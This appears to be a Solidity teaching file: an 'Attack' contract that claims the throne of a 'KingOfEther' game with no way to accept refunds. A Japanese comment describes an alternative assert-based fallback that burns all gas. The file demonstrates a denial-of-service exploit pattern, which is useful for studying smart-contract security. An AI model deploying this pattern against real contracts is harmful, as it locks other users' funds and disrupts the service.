// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./KingGame.sol";
// import "./safeKingGame.sol";

contract Attack {
    KingOfEther kingOfEther;

    constructor(KingOfEther _kingOfEther) {
        kingOfEther = KingOfEther(_kingOfEther);
    }

    /* アサートにより全ガスを消費することでDOSを行うことも可能です。
     * この攻撃は、呼び出し側のコントラクトが呼び出しが成功したかどうかを
     * チェックしない場合でも有効である。
     */ 
    // function () external payable {
    //     assert(false);
    // }

    function attack() public payable {
        kingOfEther.claimThrone{value: msg.value}();
    }
}